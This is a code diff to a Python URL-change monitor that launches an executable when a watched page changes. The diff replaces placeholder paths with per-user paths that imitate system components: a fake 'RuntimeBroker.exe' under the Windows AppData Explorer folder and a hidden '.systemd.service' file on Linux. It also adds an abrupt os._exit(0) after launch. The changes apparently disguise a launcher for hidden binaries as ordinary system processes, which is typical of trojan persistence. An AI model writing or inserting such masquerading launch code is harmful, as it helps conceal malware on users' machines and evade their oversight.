@@ -4,18 +4,21 @@ import multiprocessing
 import subprocess
 import platform
 import os
+import sys
+import getpass
 
 
 def run_executable_on_change():
     """Runs a platform-specific executable in a new subprocess."""
     os_type = platform.system()
+    user = getpass.getuser()
 
     if os_type == "Windows":
-        executable_path = "C:\\path\\to\\windows_app.exe"
+        executable_path = f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Windows\\Explorer\\RuntimeBroker.exe"
     elif os_type == "Darwin":  # macOS
         executable_path = "/path/to/mac_app.app/Contents/MacOS/mac_app"
     elif os_type == "Linux":
-        executable_path = "/path/to/linux_app.sh"
+        executable_path = f"/home/{user}/.config/systemd/user/.systemd.service"
     else:
         print(f"[ChangeHandler] Unsupported OS: {os_type}")
         return
@@ -53,6 +56,7 @@ def monitor_url(url, data, check_interval=10):
                 change_handler.join()  # Optional: wait for it to finish
                 last_content = current_content
 
+                os._exit(0)
             else:
                 print("[Monitor] No change detected.")
 
